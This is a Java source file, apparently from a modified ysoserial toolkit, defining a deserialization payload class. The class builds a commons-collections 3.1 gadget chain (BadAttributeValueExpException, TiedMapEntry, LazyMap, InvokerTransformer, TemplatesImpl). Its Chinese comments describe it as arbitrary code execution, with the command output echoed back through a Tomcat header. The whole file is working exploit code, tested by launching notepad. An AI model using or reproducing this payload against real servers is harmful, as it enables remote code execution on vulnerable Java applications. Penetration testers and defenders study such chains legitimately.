package ysoserial.payloads;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

/**
 * 无数组的 CC 链, 并且使用 XalanClassLoader 实现任意代码执行
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.HEIHU }) // 增加作者信息
public class CommonsCollectionsUseXalanAndNoArr implements ObjectPayload<BadAttributeValueExpException> {
    // implements ObjectPayload<链路入口类型>
    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command, "TomcatEcho"); // 调用 TomcatEcho 逻辑, 会返回 Runtime.getRuntime().exec(命令) 的执行结果到 Tomcat Header 头中
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        HashMap<Object, Object> map = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesImpl); // 生成 templatesImpl
        BadAttributeValueExpException o = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(o, "val", tiedMapEntry);
        return o;
    }

    // 测试当前链路是否可以走通
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsUseXalanAndNoArr.class, new String[]{"notepad"});
    }
}
